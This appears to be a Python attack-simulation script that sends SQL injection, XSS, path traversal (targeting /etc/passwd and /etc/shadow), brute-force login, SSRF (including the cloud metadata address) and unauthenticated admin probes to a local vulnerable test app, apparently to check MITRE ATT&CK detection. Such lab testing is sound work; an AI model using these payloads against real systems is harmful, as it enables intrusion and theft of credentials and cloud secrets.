#!/usr/bin/env python3
"""
VulnApp Attack Simulation Script
Testing MITRE ATT&CK technique detection
"""

import urllib.request
import urllib.parse
import time
import json

BASE_URL = "http://localhost:5000"

def http_get(url, params=None):
    full_url = f"{url}?{urllib.parse.urlencode(params)}" if params else url
    try:
        with urllib.request.urlopen(full_url, timeout=5) as resp:
            return type('Response', (), {'status_code': resp.status, 'text': resp.read().decode()})()
    except Exception as e:
        return type('Response', (), {'status_code': 500, 'text': str(e)})()

def http_post(url, data):
    post_data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=post_data, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return type('Response', (), {'status_code': resp.status, 'text': resp.read().decode()})()
    except urllib.error.HTTPError as e:
        return type('Response', (), {'status_code': e.code, 'text': e.read().decode()})()
    except Exception as e:
        return type('Response', (), {'status_code': 500, 'text': str(e)})()

def test_sql_injection():
    print("\n[+] Testing SQL Injection (T1190, T123)")
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3 --",
        "admin'--",
        "' OR ''='"
    ]
    for payload in payloads:
        r = http_get(f"{BASE_URL}/search", {"q": payload})
        print(f"  Payload: {payload[:20]}... Status: {r.status_code}")

def test_xss():
    print("\n[+] Testing XSS (T1189)")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ]
    for payload in payloads:
        r = http_get(f"{BASE_URL}/search", {"q": payload})
        print(f"  Payload: {payload[:20]}... Status: {r.status_code}")

def test_path_traversal():
    print("\n[+] Testing Path Traversal (T1190)")
    payloads = [
        "../etc/passwd",
        "../../etc/shadow",
        "%2e%2e/etc/passwd"
    ]
    for payload in payloads:
        try:
            r = http_get(f"{BASE_URL}/files/{payload}")
            print(f"  Payload: {payload[:20]}... Status: {r.status_code}")
        except:
            print(f"  Payload: {payload[:20]}... Blocked")

def test_brute_force():
    print("\n[+] Testing Brute Force (T1110)")
    for i in range(6):
        r = http_post(f"{BASE_URL}/login", {"username": "admin", "password": f"wrongpass{i}"})
        print(f"  Attempt {i+1}... Status: {r.status_code}")
        time.sleep(0.5)

def test_ssrf():
    print("\n[+] Testing SSRF (T1190)")
    urls = [
        "http://127.0.0.1:5000/api/users",
        "http://localhost:5000/login",
        "http://169.254.169.254/latest/meta-data/"
    ]
    for url in urls:
        try:
            r = http_get(f"{BASE_URL}/api/fetch", {"url": url})
            print(f"  URL: {url[:30]}... Status: {r.status_code}")
        except Exception as e:
            print(f"  URL: {url[:30]}... Error: {str(e)[:20]}")

def test_unauthorized_admin():
    print("\n[+] Testing Unauthorized Admin Access (T1548)")
    r = http_get(f"{BASE_URL}/admin")
    print(f"  Access /admin... Status: {r.status_code}")

def test_api_enumeration():
    print("\n[+] Testing API Enumeration (T1087)")
    r = http_get(f"{BASE_URL}/api/users")
    print(f"  Access /api/users... Status: {r.status_code}")
    if r.status_code == 200:
        print(f"  Data exposed: {r.text[:100]}")

if __name__ == "__main__":
    print("=" * 50)
    print("VulnApp Attack Simulation")
    print("=" * 50)
    
    try:
        test_sql_injection()
        test_xss()
        test_path_traversal()
        test_brute_force()
        test_ssrf()
        test_unauthorized_admin()
        test_api_enumeration()
    except Exception as e:
        print(f"\n[-] Server not running: {e}")
        print("Start with: python app.py")